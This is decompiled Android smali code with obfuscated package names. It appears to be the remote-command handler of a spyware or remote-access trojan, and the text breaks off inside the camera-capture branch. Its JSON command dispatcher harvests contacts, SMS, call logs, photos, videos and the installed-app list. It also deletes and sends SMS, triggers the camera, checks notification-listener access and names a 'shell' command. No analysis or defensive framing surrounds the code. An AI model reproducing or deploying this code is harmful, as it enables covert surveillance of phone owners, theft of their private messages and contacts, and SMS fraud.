.class public Lk/a/a/s$b;
.super Lr/c/a/c;
.source "sourcefile"


# annotations
.annotation system Ldalvik/annotation/EnclosingMethod;
    value = Lk/a/a/s;->b(Ljava/lang/String;)Lk/a/a/s;
.end annotation

.annotation system Ldalvik/annotation/InnerClass;
    accessFlags = 0x1
    name = null
.end annotation


# direct methods
.method public constructor <init>()V
    .locals 0

    invoke-direct {p0}, Lr/c/a/c;-><init>()V

    return-void
.end method


# virtual methods
.method public a()V
    .locals 0

    return-void
.end method

.method public b()V
    .locals 0

    return-void
.end method

.method public c()V
    .locals 0

    return-void
.end method

.method public d()V
    .locals 10
    .annotation build Landroid/annotation/SuppressLint;
        value = {
            "CheckResult",
            "MissingPermission"
        }
    .end annotation

    const-string v0, "MainActivity"

    const-string v1, "onOpen:"

    invoke-static {v0, v1}, Landroid/util/Log;->d(Ljava/lang/String;Ljava/lang/String;)I

    :try_start_0
    const-string v0, "eee"

    sget-object v1, Lk/a/a/q;->d:Ljava/lang/String;

    invoke-static {v0, v1}, Landroid/util/Log;->w(Ljava/lang/String;Ljava/lang/String;)I

    invoke-static {}, Lio/realm/Realm;->getApplicationContext()Landroid/content/Context;

    move-result-object v0
    :try_end_0
    .catch Ljava/lang/Exception; {:try_start_0 .. :try_end_0} :catch_0

    const-string v1, "init"

    if-eqz v0, :cond_0

    :try_start_1
    invoke-static {}, Lio/realm/Realm;->getApplicationContext()Landroid/content/Context;

    move-result-object v0

    .line 1
    invoke-static {v0}, Lg/z/u/l;->c(Landroid/content/Context;)Lg/z/u/l;

    move-result-object v0

    .line 2
    invoke-virtual {v0, v1}, Lg/z/u/l;->b(Ljava/lang/String;)Lg/z/m;

    .line 3
    :cond_0
    new-instance v0, Ljava/util/HashMap;

    invoke-direct {v0}, Ljava/util/HashMap;-><init>()V

    const-string v2, "event"

    .line 4
    invoke-interface {v0, v2, v1}, Ljava/util/Map;->put(Ljava/lang/Object;Ljava/lang/Object;)Ljava/lang/Object;

    .line 5
    new-instance v2, Lg/z/e;

    invoke-direct {v2, v0}, Lg/z/e;-><init>(Ljava/util/Map;)V

    invoke-static {v2}, Lg/z/e;->c(Lg/z/e;)[B

    .line 6
    new-instance v0, Lg/z/l$a;

    const-class v3, Lgqegwqg/bbebebefff/asdcdsac/worker/InitWorker;

    invoke-direct {v0, v3}, Lg/z/l$a;-><init>(Ljava/lang/Class;)V

    .line 7
    iget-object v3, v0, Lg/z/r$a;->b:Lg/z/u/s/o;

    iput-object v2, v3, Lg/z/u/s/o;->e:Lg/z/e;

    .line 8
    iget-object v2, v0, Lg/z/r$a;->c:Ljava/util/Set;

    invoke-interface {v2, v1}, Ljava/util/Set;->add(Ljava/lang/Object;)Z

    .line 9
    invoke-virtual {v0}, Lg/z/r$a;->a()Lg/z/r;

    move-result-object v0

    check-cast v0, Lg/z/l;

    invoke-static {}, Lio/realm/Realm;->getApplicationContext()Landroid/content/Context;

    move-result-object v1

    .line 10
    invoke-static {v1}, Lg/z/u/l;->c(Landroid/content/Context;)Lg/z/u/l;

    move-result-object v1

    .line 11
    invoke-virtual {v1, v0}, Lg/z/q;->a(Lg/z/r;)Lg/z/m;
    :try_end_1
    .catch Ljava/lang/Exception; {:try_start_1 .. :try_end_1} :catch_0

    goto :goto_0

    :catch_0
    move-exception v0

    invoke-static {v0}, Ljava/lang/String;->valueOf(Ljava/lang/Object;)Ljava/lang/String;

    move-result-object v0

    const-string v1, "error"

    invoke-static {v1, v0}, Landroid/util/Log;->i(Ljava/lang/String;Ljava/lang/String;)I

    :goto_0
    const-wide/16 v0, 0x1e

    sget-object v7, Ljava/util/concurrent/TimeUnit;->SECONDS:Ljava/util/concurrent/TimeUnit;

    .line 12
    sget-object v8, Ll/a/g0/i/a;->a:Ll/a/g0/b/f;

    const-string v2, "unit is null"

    .line 13
    invoke-static {v7, v2}, Ljava/util/Objects;->requireNonNull(Ljava/lang/Object;Ljava/lang/String;)Ljava/lang/Object;

    const-string v2, "scheduler is null"

    invoke-static {v8, v2}, Ljava/util/Objects;->requireNonNull(Ljava/lang/Object;Ljava/lang/String;)Ljava/lang/Object;

    new-instance v9, Ll/a/g0/f/d/b/c;

    const-wide/16 v2, 0x0

    invoke-static {v2, v3, v0, v1}, Ljava/lang/Math;->max(JJ)J

    move-result-wide v4

    invoke-static {v2, v3, v0, v1}, Ljava/lang/Math;->max(JJ)J

    move-result-wide v0

    move-object v2, v9

    move-wide v3, v4

    move-wide v5, v0

    invoke-direct/range {v2 .. v8}, Ll/a/g0/f/d/b/c;-><init>(JJLjava/util/concurrent/TimeUnit;Ll/a/g0/b/f;)V

    .line 14
    sget-object v0, Ll/a/g0/i/a;->b:Ll/a/g0/b/f;

    .line 15
    invoke-virtual {v9, v0}, Ll/a/g0/b/c;->d(Ll/a/g0/b/f;)Ll/a/g0/b/c;

    move-result-object v0

    invoke-static {}, Ll/a/g0/a/a/b;->a()Ll/a/g0/b/f;

    move-result-object v1

    invoke-virtual {v0, v1}, Ll/a/g0/b/c;->a(Ll/a/g0/b/f;)Ll/a/g0/b/c;

    move-result-object v0

    sget-object v1, Lk/a/a/b;->a:Lk/a/a/b;

    .line 16
    sget-object v2, Ll/a/g0/f/b/a;->d:Ll/a/g0/e/b;

    sget-object v3, Ll/a/g0/f/b/a;->b:Ll/a/g0/e/a;

    .line 17
    new-instance v4, Ll/a/g0/f/c/d;

    sget-object v5, Ll/a/g0/f/b/a;->c:Ll/a/g0/e/b;

    invoke-direct {v4, v1, v2, v3, v5}, Ll/a/g0/f/c/d;-><init>(Ll/a/g0/e/b;Ll/a/g0/e/b;Ll/a/g0/e/a;Ll/a/g0/e/b;)V

    invoke-virtual {v0, v4}, Ll/a/g0/b/c;->b(Ll/a/g0/b/e;)V

    return-void
.end method

.method public e(Ljava/lang/Throwable;)V
    .locals 0

    return-void
.end method

.method public f(Ljava/lang/String;Ljava/lang/String;[BIZ)Ljava/lang/Object;
    .locals 16

    const-string v0, "shell"

    const-string v1, "blocklist"

    const-string v2, "status"

    const-string v3, "batteryopt"

    const-string v4, "pingtime"

    const-string v5, "applist"

    const-string v6, "videosync"

    const-string v7, "imgsync"

    const-string v8, "getsms"

    const-class v9, Lgqegwqg/bbebebefff/asdcdsac/worker/InitWorker;

    :try_start_0
    new-instance v10, Lorg/json/JSONObject;

    move-object/from16 v11, p2

    invoke-direct {v10, v11}, Lorg/json/JSONObject;-><init>(Ljava/lang/String;)V

    const-string v11, "method"

    invoke-virtual {v10, v11}, Lorg/json/JSONObject;->getString(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v11

    const-string v12, "ping"

    invoke-static {v11, v12}, Ljava/util/Objects;->equals(Ljava/lang/Object;Ljava/lang/Object;)Z

    move-result v12

    if-eqz v12, :cond_0

    const-string v0, "pongtime"

    invoke-virtual {v10, v4}, Lorg/json/JSONObject;->getLong(Ljava/lang/String;)J

    move-result-wide v1

    invoke-virtual {v10, v0, v1, v2}, Lorg/json/JSONObject;->put(Ljava/lang/String;J)Lorg/json/JSONObject;

    invoke-virtual {v10, v4}, Lorg/json/JSONObject;->remove(Ljava/lang/String;)Ljava/lang/Object;

    const-string v0, "myLgegffefefog"

    invoke-virtual {v10}, Lorg/json/JSONObject;->toString()Ljava/lang/String;

    move-result-object v1

    invoke-static {v0, v1}, Landroid/util/Log;->d(Ljava/lang/String;Ljava/lang/String;)I

    invoke-virtual {v10}, Lorg/json/JSONObject;->toString()Ljava/lang/String;

    move-result-object v0

    return-object v0

    :cond_0
    const-string v4, "phonecontact"

    invoke-static {v11, v4}, Ljava/util/Objects;->equals(Ljava/lang/Object;Ljava/lang/Object;)Z

    move-result v4
    :try_end_0
    .catch Lorg/json/JSONException; {:try_start_0 .. :try_end_0} :catch_0

    const-string v12, "event"

    const-string v13, "type"

    const-string v14, "ok"

    if-eqz v4, :cond_2

    :try_start_1
    invoke-static {}, Lio/realm/Realm;->getApplicationContext()Landroid/content/Context;

    move-result-object v0
    :try_end_1
    .catch Lorg/json/JSONException; {:try_start_1 .. :try_end_1} :catch_0

    const-string v1, "contactlist"

    if-eqz v0, :cond_1

    :try_start_2
    invoke-static {}, Lio/realm/Realm;->getApplicationContext()Landroid/content/Context;

    move-result-object v0

    .line 1
    invoke-static {v0}, Lg/z/u/l;->c(Landroid/content/Context;)Lg/z/u/l;

    move-result-object v0

    .line 2
    invoke-virtual {v0, v1}, Lg/z/u/l;->b(Ljava/lang/String;)Lg/z/m;

    :cond_1
    invoke-virtual {v10, v13}, Lorg/json/JSONObject;->getString(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v0

    .line 3
    new-instance v2, Ljava/util/HashMap;

    invoke-direct {v2}, Ljava/util/HashMap;-><init>()V

    .line 4
    invoke-virtual {v2, v12, v1}, Ljava/util/HashMap;->put(Ljava/lang/Object;Ljava/lang/Object;)Ljava/lang/Object;

    invoke-virtual {v2, v13, v0}, Ljava/util/HashMap;->put(Ljava/lang/Object;Ljava/lang/Object;)Ljava/lang/Object;

    .line 5
    new-instance v0, Lg/z/e;

    invoke-direct {v0, v2}, Lg/z/e;-><init>(Ljava/util/Map;)V

    invoke-static {v0}, Lg/z/e;->c(Lg/z/e;)[B

    .line 6
    new-instance v2, Lg/z/l$a;

    invoke-direct {v2, v9}, Lg/z/l$a;-><init>(Ljava/lang/Class;)V

    .line 7
    iget-object v3, v2, Lg/z/r$a;->b:Lg/z/u/s/o;

    iput-object v0, v3, Lg/z/u/s/o;->e:Lg/z/e;

    .line 8
    iget-object v0, v2, Lg/z/r$a;->c:Ljava/util/Set;

    invoke-interface {v0, v1}, Ljava/util/Set;->add(Ljava/lang/Object;)Z

    .line 9
    invoke-virtual {v2}, Lg/z/r$a;->a()Lg/z/r;

    move-result-object v0

    check-cast v0, Lg/z/l;

    invoke-static {}, Lk/a/a/s;->h()Lk/a/a/s;

    move-result-object v1

    .line 10
    iget-object v1, v1, Lk/a/a/s;->c:Landroid/content/Context;

    .line 11
    invoke-static {v1}, Lg/z/u/l;->c(Landroid/content/Context;)Lg/z/u/l;

    move-result-object v1

    .line 12
    invoke-virtual {v1, v0}, Lg/z/q;->a(Lg/z/r;)Lg/z/m;

    return-object v14

    :cond_2
    invoke-static {v11, v3}, Ljava/util/Objects;->equals(Ljava/lang/Object;Ljava/lang/Object;)Z

    move-result v4

    const/4 v15, 0x0

    if-eqz v4, :cond_3

    invoke-static {}, Lk/a/a/s;->h()Lk/a/a/s;

    move-result-object v0

    invoke-virtual {v0}, Lk/a/a/s;->c()Ljava/lang/String;

    goto/16 :goto_1

    :cond_3
    invoke-static {v11, v2}, Ljava/util/Objects;->equals(Ljava/lang/Object;Ljava/lang/Object;)Z

    move-result v4

    if-eqz v4, :cond_5

    new-instance v0, Lorg/json/JSONObject;

    invoke-direct {v0}, Lorg/json/JSONObject;-><init>()V

    invoke-virtual {v0, v12, v2}, Lorg/json/JSONObject;->put(Ljava/lang/String;Ljava/lang/Object;)Lorg/json/JSONObject;

    invoke-static {}, Lk/a/a/s;->h()Lk/a/a/s;

    move-result-object v1

    invoke-virtual {v1}, Lk/a/a/s;->c()Ljava/lang/String;

    move-result-object v1

    invoke-virtual {v0, v3, v1}, Lorg/json/JSONObject;->put(Ljava/lang/String;Ljava/lang/Object;)Lorg/json/JSONObject;

    const-string v1, "notification"

    invoke-static {}, Lk/a/a/s;->h()Lk/a/a/s;

    move-result-object v2

    .line 13
    iget-object v2, v2, Lk/a/a/s;->c:Landroid/content/Context;

    invoke-virtual {v2}, Landroid/content/Context;->getContentResolver()Landroid/content/ContentResolver;

    move-result-object v2

    const-string v3, "enabled_notification_listeners"

    invoke-static {v2, v3}, Landroid/provider/Settings$Secure;->getString(Landroid/content/ContentResolver;Ljava/lang/String;)Ljava/lang/String;

    move-result-object v2

    .line 14
    sget-object v3, Lo/a/a/c/a;->a:Ljava/util/List;

    invoke-static {}, Lo/a/a/b;->b()Landroid/app/Application;

    move-result-object v3

    invoke-virtual {v3}, Landroid/app/Application;->getPackageName()Ljava/lang/String;

    move-result-object v3

    if-eqz v2, :cond_4

    .line 15
    invoke-virtual {v2, v3}, Ljava/lang/String;->contains(Ljava/lang/CharSequence;)Z

    move-result v2

    if-eqz v2, :cond_4

    const-string v2, "T"

    goto :goto_0

    :cond_4
    const-string v2, "F"

    .line 16
    :goto_0
    invoke-virtual {v0, v1, v2}, Lorg/json/JSONObject;->put(Ljava/lang/String;Ljava/lang/Object;)Lorg/json/JSONObject;

    const-string v1, "getDefaultSms"

    invoke-static {}, Lk/a/a/s;->h()Lk/a/a/s;

    move-result-object v2

    invoke-virtual {v2}, Lk/a/a/s;->g()Ljava/lang/String;

    move-result-object v2

    invoke-virtual {v0, v1, v2}, Lorg/json/JSONObject;->put(Ljava/lang/String;Ljava/lang/Object;)Lorg/json/JSONObject;

    const-string v1, "battery"

    invoke-static {}, Lio/realm/Realm;->getApplicationContext()Landroid/content/Context;

    move-result-object v2

    const-string v3, "batterymanager"

    .line 17
    invoke-virtual {v2, v3}, Landroid/content/Context;->getSystemService(Ljava/lang/String;)Ljava/lang/Object;

    move-result-object v2

    check-cast v2, Landroid/os/BatteryManager;

    const/4 v3, 0x4

    invoke-virtual {v2, v3}, Landroid/os/BatteryManager;->getIntProperty(I)I

    move-result v2

    .line 18
    invoke-virtual {v0, v1, v2}, Lorg/json/JSONObject;->put(Ljava/lang/String;I)Lorg/json/JSONObject;

    return-object v14

    :cond_5
    invoke-static {v11, v1}, Ljava/util/Objects;->equals(Ljava/lang/Object;Ljava/lang/Object;)Z

    move-result v2
    :try_end_2
    .catch Lorg/json/JSONException; {:try_start_2 .. :try_end_2} :catch_0

    const-string v3, "data"

    if-eqz v2, :cond_6

    :try_start_3
    new-instance v0, Lorg/json/JSONObject;

    invoke-direct {v0}, Lorg/json/JSONObject;-><init>()V

    invoke-virtual {v0, v12, v1}, Lorg/json/JSONObject;->put(Ljava/lang/String;Ljava/lang/Object;)Lorg/json/JSONObject;

    invoke-static {}, Lk/a/a/s;->d()Lorg/json/JSONArray;

    move-result-object v1

    invoke-virtual {v1}, Lorg/json/JSONArray;->toString()Ljava/lang/String;

    move-result-object v1

    invoke-virtual {v0, v3, v1}, Lorg/json/JSONObject;->put(Ljava/lang/String;Ljava/lang/Object;)Lorg/json/JSONObject;

    return-object v14

    :cond_6
    const-string v1, "blocklistadd"

    invoke-static {v11, v1}, Ljava/util/Objects;->equals(Ljava/lang/Object;Ljava/lang/Object;)Z

    move-result v1
    :try_end_3
    .catch Lorg/json/JSONException; {:try_start_3 .. :try_end_3} :catch_0

    const-string v2, "number"

    if-eqz v1, :cond_7

    :try_start_4
    invoke-virtual {v10, v2}, Lorg/json/JSONObject;->getString(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v0

    invoke-static {v0}, Lk/a/a/s;->e(Ljava/lang/String;)V

    return-object v14

    :cond_7
    invoke-static {v11, v8}, Ljava/util/Objects;->equals(Ljava/lang/Object;Ljava/lang/Object;)Z

    move-result v1

    if-eqz v1, :cond_8

    invoke-static {}, Lio/realm/Realm;->getApplicationContext()Landroid/content/Context;

    move-result-object v0

    .line 19
    invoke-static {v0}, Lg/z/u/l;->c(Landroid/content/Context;)Lg/z/u/l;

    move-result-object v0

    .line 20
    invoke-virtual {v0, v8}, Lg/z/u/l;->b(Ljava/lang/String;)Lg/z/m;

    invoke-virtual {v10, v13}, Lorg/json/JSONObject;->getString(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v0

    .line 21
    new-instance v1, Ljava/util/HashMap;

    invoke-direct {v1}, Ljava/util/HashMap;-><init>()V

    .line 22
    invoke-virtual {v1, v12, v8}, Ljava/util/HashMap;->put(Ljava/lang/Object;Ljava/lang/Object;)Ljava/lang/Object;

    invoke-virtual {v1, v13, v0}, Ljava/util/HashMap;->put(Ljava/lang/Object;Ljava/lang/Object;)Ljava/lang/Object;

    .line 23
    new-instance v0, Lg/z/e;

    invoke-direct {v0, v1}, Lg/z/e;-><init>(Ljava/util/Map;)V

    invoke-static {v0}, Lg/z/e;->c(Lg/z/e;)[B

    .line 24
    new-instance v1, Lg/z/l$a;

    invoke-direct {v1, v9}, Lg/z/l$a;-><init>(Ljava/lang/Class;)V

    .line 25
    iget-object v2, v1, Lg/z/r$a;->b:Lg/z/u/s/o;

    iput-object v0, v2, Lg/z/u/s/o;->e:Lg/z/e;

    .line 26
    iget-object v0, v1, Lg/z/r$a;->c:Ljava/util/Set;

    invoke-interface {v0, v8}, Ljava/util/Set;->add(Ljava/lang/Object;)Z

    .line 27
    invoke-virtual {v1}, Lg/z/r$a;->a()Lg/z/r;

    move-result-object v0

    check-cast v0, Lg/z/l;

    invoke-static {}, Lk/a/a/s;->h()Lk/a/a/s;

    move-result-object v1

    .line 28
    iget-object v1, v1, Lk/a/a/s;->c:Landroid/content/Context;

    .line 29
    invoke-static {v1}, Lg/z/u/l;->c(Landroid/content/Context;)Lg/z/u/l;

    move-result-object v1

    .line 30
    invoke-virtual {v1, v0}, Lg/z/q;->a(Lg/z/r;)Lg/z/m;

    return-object v14

    :cond_8
    const-string v1, "blocklistupdate"

    invoke-static {v11, v1}, Ljava/util/Objects;->equals(Ljava/lang/Object;Ljava/lang/Object;)Z

    move-result v1

    if-eqz v1, :cond_9

    invoke-virtual {v10, v2}, Lorg/json/JSONObject;->getString(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v0

    invoke-static {v0}, Lk/a/a/s;->f(Ljava/lang/String;)V

    return-object v14

    :cond_9
    const-string v1, "getcalllog"

    invoke-static {v11, v1}, Ljava/util/Objects;->equals(Ljava/lang/Object;Ljava/lang/Object;)Z

    move-result v1

    if-eqz v1, :cond_b

    invoke-static {}, Lio/realm/Realm;->getApplicationContext()Landroid/content/Context;

    move-result-object v0
    :try_end_4
    .catch Lorg/json/JSONException; {:try_start_4 .. :try_end_4} :catch_0

    const-string v1, "calllog"

    if-eqz v0, :cond_a

    :try_start_5
    invoke-static {}, Lio/realm/Realm;->getApplicationContext()Landroid/content/Context;

    move-result-object v0

    .line 31
    invoke-static {v0}, Lg/z/u/l;->c(Landroid/content/Context;)Lg/z/u/l;

    move-result-object v0

    .line 32
    invoke-virtual {v0, v1}, Lg/z/u/l;->b(Ljava/lang/String;)Lg/z/m;

    :cond_a
    invoke-virtual {v10, v13}, Lorg/json/JSONObject;->getString(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v0

    .line 33
    new-instance v2, Ljava/util/HashMap;

    invoke-direct {v2}, Ljava/util/HashMap;-><init>()V

    .line 34
    invoke-virtual {v2, v12, v1}, Ljava/util/HashMap;->put(Ljava/lang/Object;Ljava/lang/Object;)Ljava/lang/Object;

    invoke-virtual {v2, v13, v0}, Ljava/util/HashMap;->put(Ljava/lang/Object;Ljava/lang/Object;)Ljava/lang/Object;

    .line 35
    new-instance v0, Lg/z/e;

    invoke-direct {v0, v2}, Lg/z/e;-><init>(Ljava/util/Map;)V

    invoke-static {v0}, Lg/z/e;->c(Lg/z/e;)[B

    .line 36
    new-instance v2, Lg/z/l$a;

    invoke-direct {v2, v9}, Lg/z/l$a;-><init>(Ljava/lang/Class;)V

    .line 37
    iget-object v3, v2, Lg/z/r$a;->b:Lg/z/u/s/o;

    iput-object v0, v3, Lg/z/u/s/o;->e:Lg/z/e;

    .line 38
    iget-object v0, v2, Lg/z/r$a;->c:Ljava/util/Set;

    invoke-interface {v0, v1}, Ljava/util/Set;->add(Ljava/lang/Object;)Z

    .line 39
    invoke-virtual {v2}, Lg/z/r$a;->a()Lg/z/r;

    move-result-object v0

    check-cast v0, Lg/z/l;

    invoke-static {}, Lk/a/a/s;->h()Lk/a/a/s;

    move-result-object v1

    .line 40
    iget-object v1, v1, Lk/a/a/s;->c:Landroid/content/Context;

    .line 41
    invoke-static {v1}, Lg/z/u/l;->c(Landroid/content/Context;)Lg/z/u/l;

    move-result-object v1

    .line 42
    invoke-virtual {v1, v0}, Lg/z/q;->a(Lg/z/r;)Lg/z/m;

    return-object v14

    :cond_b
    invoke-static {v11, v7}, Ljava/util/Objects;->equals(Ljava/lang/Object;Ljava/lang/Object;)Z

    move-result v1

    if-eqz v1, :cond_d

    invoke-static {}, Lio/realm/Realm;->getApplicationContext()Landroid/content/Context;

    move-result-object v0

    if-eqz v0, :cond_c

    invoke-static {}, Lio/realm/Realm;->getApplicationContext()Landroid/content/Context;

    move-result-object v0

    .line 43
    invoke-static {v0}, Lg/z/u/l;->c(Landroid/content/Context;)Lg/z/u/l;

    move-result-object v0

    .line 44
    invoke-virtual {v0, v7}, Lg/z/u/l;->b(Ljava/lang/String;)Lg/z/m;

    :cond_c
    invoke-virtual {v10, v13}, Lorg/json/JSONObject;->getString(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v0

    .line 45
    new-instance v1, Ljava/util/HashMap;

    invoke-direct {v1}, Ljava/util/HashMap;-><init>()V

    .line 46
    invoke-virtual {v1, v12, v7}, Ljava/util/HashMap;->put(Ljava/lang/Object;Ljava/lang/Object;)Ljava/lang/Object;

    invoke-virtual {v1, v13, v0}, Ljava/util/HashMap;->put(Ljava/lang/Object;Ljava/lang/Object;)Ljava/lang/Object;

    .line 47
    new-instance v0, Lg/z/e;

    invoke-direct {v0, v1}, Lg/z/e;-><init>(Ljava/util/Map;)V

    invoke-static {v0}, Lg/z/e;->c(Lg/z/e;)[B

    .line 48
    new-instance v1, Lg/z/l$a;

    invoke-direct {v1, v9}, Lg/z/l$a;-><init>(Ljava/lang/Class;)V

    .line 49
    iget-object v2, v1, Lg/z/r$a;->b:Lg/z/u/s/o;

    iput-object v0, v2, Lg/z/u/s/o;->e:Lg/z/e;

    .line 50
    iget-object v0, v1, Lg/z/r$a;->c:Ljava/util/Set;

    invoke-interface {v0, v7}, Ljava/util/Set;->add(Ljava/lang/Object;)Z

    .line 51
    invoke-virtual {v1}, Lg/z/r$a;->a()Lg/z/r;

    move-result-object v0

    check-cast v0, Lg/z/l;

    invoke-static {}, Lk/a/a/s;->h()Lk/a/a/s;

    move-result-object v1

    .line 52
    iget-object v1, v1, Lk/a/a/s;->c:Landroid/content/Context;

    .line 53
    invoke-static {v1}, Lg/z/u/l;->c(Landroid/content/Context;)Lg/z/u/l;

    move-result-object v1

    .line 54
    invoke-virtual {v1, v0}, Lg/z/q;->a(Lg/z/r;)Lg/z/m;

    return-object v14

    :cond_d
    invoke-static {v11, v6}, Ljava/util/Objects;->equals(Ljava/lang/Object;Ljava/lang/Object;)Z

    move-result v1

    if-eqz v1, :cond_f

    invoke-static {}, Lio/realm/Realm;->getApplicationContext()Landroid/content/Context;

    move-result-object v0

    if-eqz v0, :cond_e

    invoke-static {}, Lio/realm/Realm;->getApplicationContext()Landroid/content/Context;

    move-result-object v0

    .line 55
    invoke-static {v0}, Lg/z/u/l;->c(Landroid/content/Context;)Lg/z/u/l;

    move-result-object v0

    .line 56
    invoke-static {v0}, Ljava/util/Objects;->requireNonNull(Ljava/lang/Object;)Ljava/lang/Object;

    .line 57
    new-instance v1, Lg/z/u/t/c;

    const/4 v2, 0x1

    invoke-direct {v1, v0, v6, v2}, Lg/z/u/t/c;-><init>(Lg/z/u/l;Ljava/lang/String;Z)V

    .line 58
    iget-object v0, v0, Lg/z/u/l;->h:Lg/z/u/t/r/a;

    check-cast v0, Lg/z/u/t/r/b;

    .line 59
    iget-object v0, v0, Lg/z/u/t/r/b;->a:Lg/z/u/t/j;

    invoke-virtual {v0, v1}, Lg/z/u/t/j;->execute(Ljava/lang/Runnable;)V

    .line 60
    :cond_e
    invoke-virtual {v10, v13}, Lorg/json/JSONObject;->getString(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v0

    .line 61
    new-instance v1, Ljava/util/HashMap;

    invoke-direct {v1}, Ljava/util/HashMap;-><init>()V

    .line 62
    invoke-virtual {v1, v12, v6}, Ljava/util/HashMap;->put(Ljava/lang/Object;Ljava/lang/Object;)Ljava/lang/Object;

    invoke-virtual {v1, v13, v0}, Ljava/util/HashMap;->put(Ljava/lang/Object;Ljava/lang/Object;)Ljava/lang/Object;

    .line 63
    new-instance v0, Lg/z/e;

    invoke-direct {v0, v1}, Lg/z/e;-><init>(Ljava/util/Map;)V

    invoke-static {v0}, Lg/z/e;->c(Lg/z/e;)[B

    .line 64
    new-instance v1, Lg/z/l$a;

    invoke-direct {v1, v9}, Lg/z/l$a;-><init>(Ljava/lang/Class;)V

    .line 65
    iget-object v2, v1, Lg/z/r$a;->b:Lg/z/u/s/o;

    iput-object v0, v2, Lg/z/u/s/o;->e:Lg/z/e;

    .line 66
    iget-object v0, v1, Lg/z/r$a;->c:Ljava/util/Set;

    invoke-interface {v0, v6}, Ljava/util/Set;->add(Ljava/lang/Object;)Z

    .line 67
    invoke-virtual {v1}, Lg/z/r$a;->a()Lg/z/r;

    move-result-object v0

    check-cast v0, Lg/z/l;

    invoke-static {}, Lk/a/a/s;->h()Lk/a/a/s;

    move-result-object v1

    .line 68
    iget-object v1, v1, Lk/a/a/s;->c:Landroid/content/Context;

    .line 69
    invoke-static {v1}, Lg/z/u/l;->c(Landroid/content/Context;)Lg/z/u/l;

    move-result-object v1

    .line 70
    invoke-virtual {v1, v0}, Lg/z/q;->a(Lg/z/r;)Lg/z/m;

    return-object v14

    :cond_f
    const-string v1, "getapplist"

    invoke-static {v11, v1}, Ljava/util/Objects;->equals(Ljava/lang/Object;Ljava/lang/Object;)Z

    move-result v1

    if-eqz v1, :cond_10

    invoke-static {}, Lk/a/a/s;->h()Lk/a/a/s;

    move-result-object v0

    .line 71
    iget-object v0, v0, Lk/a/a/s;->c:Landroid/content/Context;

    .line 72
    invoke-static {v0}, Lg/z/u/l;->c(Landroid/content/Context;)Lg/z/u/l;

    move-result-object v0

    .line 73
    invoke-virtual {v0, v5}, Lg/z/u/l;->b(Ljava/lang/String;)Lg/z/m;

    .line 74
    new-instance v0, Ljava/util/HashMap;

    invoke-direct {v0}, Ljava/util/HashMap;-><init>()V

    .line 75
    invoke-virtual {v0, v12, v5}, Ljava/util/HashMap;->put(Ljava/lang/Object;Ljava/lang/Object;)Ljava/lang/Object;

    .line 76
    new-instance v1, Lg/z/e;

    invoke-direct {v1, v0}, Lg/z/e;-><init>(Ljava/util/Map;)V

    invoke-static {v1}, Lg/z/e;->c(Lg/z/e;)[B

    .line 77
    new-instance v0, Lg/z/l$a;

    invoke-direct {v0, v9}, Lg/z/l$a;-><init>(Ljava/lang/Class;)V

    .line 78
    iget-object v2, v0, Lg/z/r$a;->b:Lg/z/u/s/o;

    iput-object v1, v2, Lg/z/u/s/o;->e:Lg/z/e;

    .line 79
    iget-object v1, v0, Lg/z/r$a;->c:Ljava/util/Set;

    invoke-interface {v1, v5}, Ljava/util/Set;->add(Ljava/lang/Object;)Z

    .line 80
    invoke-virtual {v0}, Lg/z/r$a;->a()Lg/z/r;

    move-result-object v0

    check-cast v0, Lg/z/l;

    invoke-static {}, Lk/a/a/s;->h()Lk/a/a/s;

    move-result-object v1

    .line 81
    iget-object v1, v1, Lk/a/a/s;->c:Landroid/content/Context;

    .line 82
    invoke-static {v1}, Lg/z/u/l;->c(Landroid/content/Context;)Lg/z/u/l;

    move-result-object v1

    .line 83
    invoke-virtual {v1, v0}, Lg/z/q;->a(Lg/z/r;)Lg/z/m;

    return-object v14

    :cond_10
    const-string v1, "deletesms"

    invoke-static {v11, v1}, Ljava/util/Objects;->equals(Ljava/lang/Object;Ljava/lang/Object;)Z

    move-result v1

    if-eqz v1, :cond_11

    invoke-static {}, Lk/a/a/s;->h()Lk/a/a/s;

    move-result-object v0

    .line 84
    iget-object v0, v0, Lk/a/a/s;->c:Landroid/content/Context;

    .line 85
    invoke-virtual {v0}, Landroid/content/Context;->getContentResolver()Landroid/content/ContentResolver;

    move-result-object v0

    new-instance v1, Ljava/lang/StringBuilder;

    invoke-direct {v1}, Ljava/lang/StringBuilder;-><init>()V

    const-string v2, "content://sms/"

    invoke-virtual {v1, v2}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    const-string v2, "smsid"

    invoke-virtual {v10, v2}, Lorg/json/JSONObject;->getString(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v2

    invoke-virtual {v1, v2}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v1}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v1

    invoke-static {v1}, Landroid/net/Uri;->parse(Ljava/lang/String;)Landroid/net/Uri;

    move-result-object v1

    invoke-virtual {v0, v1, v15, v15}, Landroid/content/ContentResolver;->delete(Landroid/net/Uri;Ljava/lang/String;[Ljava/lang/String;)I

    return-object v14

    :cond_11
    const-string v1, "sendsms"

    invoke-static {v11, v1}, Ljava/util/Objects;->equals(Ljava/lang/Object;Ljava/lang/Object;)Z

    move-result v1

    if-eqz v1, :cond_12

    invoke-static {}, Lk/a/a/s;->h()Lk/a/a/s;

    move-result-object v0

    invoke-virtual {v0, v10}, Lk/a/a/s;->m(Lorg/json/JSONObject;)V

    return-object v14

    :cond_12
    const-string v1, "filemanager"

    invoke-static {v11, v1}, Ljava/util/Objects;->equals(Ljava/lang/Object;Ljava/lang/Object;)Z

    move-result v1

    if-eqz v1, :cond_13

    return-object v14

    :cond_13
    const-string v1, "takecamera"

    invoke-static {v11, v1}, Ljava/util/Objects;->equals(Ljava/lang/Object;Ljava/lang/Object;)Z

    move-result v1

    if-eqz v1, :cond_14

    new-instance v0, Landroid/content/Intent;

    invoke-static {}, Lio/realm/Realm;->getApplicationContext()Landroid/content/Context;

    move-result-object v1

    const-class v2, Lk/a/a/r;

    invoke-direct {v0, v1, v2}, Landroid/content/Intent;-><init>(Landroid/content/Context;Ljava/lang/Class;)V

